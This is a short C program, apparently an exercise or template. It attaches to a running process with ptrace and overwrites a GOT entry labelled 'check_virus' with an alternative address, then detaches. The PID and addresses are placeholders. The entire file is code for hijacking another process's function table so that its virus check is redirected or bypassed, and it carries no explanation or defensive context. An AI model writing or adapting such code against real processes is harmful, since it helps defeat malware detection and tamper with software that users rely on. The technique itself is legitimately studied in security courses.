#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


int pid = 0x12345678;
int addr_got_check_virus = 0x91011121;
int addr_alternative = 0x87785655;


int main() {
	if (ptrace(PTRACE_ATTACH, pid,NULL,NULL)==-1){
		perror("attach");
		return 1;
	}
	int status;
	waitpid(pid, &status, 0);
	if (WIFEXITED(status)){ 
		printf("wifexited\n");
		return 2;
	}

	if (ptrace(PTRACE_POKETEXT, pid, addr_got_check_virus, addr_alternative)==-1){
		perror("poketext");
		return 1;
	}


	if (ptrace(PTRACE_DETACH, pid, NULL, NULL)== -1){
		perror("detach");
		return 1;
	}




    return 0;
}
